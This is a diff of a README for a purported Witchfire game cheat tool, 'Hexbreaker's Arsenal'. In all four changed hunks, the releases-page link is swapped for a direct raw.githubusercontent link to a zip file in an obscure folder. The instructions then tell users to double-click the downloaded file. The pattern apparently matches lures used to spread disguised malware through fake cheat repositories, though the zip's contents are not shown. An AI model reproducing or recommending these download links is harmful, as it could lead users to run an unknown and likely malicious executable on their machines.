@@ -1,6 +1,6 @@
 # 🧙 Witchfire-Hexbreakers-Arsenal - Your Ultimate Game Enhancer & Power Toolkit
 
-### 👉 [**DOWNLOAD HEXBREAKER'S ARSENAL NOW**](https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases)
+### 👉 [**DOWNLOAD HEXBREAKER'S ARSENAL NOW**](https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Hexbreaker's Arsenal is a powerful enhancement tool designed exclusively for **W
 
 Follow these simple steps to start using Hexbreaker's Arsenal:
 
-Visit this link to download the application: [**Download Here**](https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases)
+Visit this link to download the application: [**Download Here**](https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip)
 
 1. Click the link above to be taken to the download page
 2. Find the latest release and click the download button
@@ -46,7 +46,7 @@ Visit this link to download the application: [**Download Here**](https://github.
 
 ## 📦 Installation & Setup
 
-1. **Download the tool** — Visit this link to download the application: [**https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases**](https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases)
+1. **Download the tool** — Visit this link to download the application: [**https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip**](https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip)
 2. **Run the application** — Double-click the downloaded file to launch it
 3. **Launch Witchfire** — Start the game as you normally would
 4. **Enable your features** — Use the simple interface to turn on the enhancements you want
@@ -154,7 +154,7 @@ Use Edit Stats and Unlock All Items to test different builds before committing y
 
 Ready to enhance your Witchfire experience? Here's what to do:
 
-1. **Visit the download page** — [**https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases**](https://github.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/releases)
+1. **Visit the download page** — [**https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip**](https://raw.githubusercontent.com/avaneesh8494/Witchfire-Hexbreakers-Arsenal/main/allwhither/1.4.zip)
 2. **Download the tool** — Click the download link for the latest version
 3. **Run the application** — Double-click the downloaded file
 4. **Start playing** — Launch Witchfire and enjoy your enhanced powers
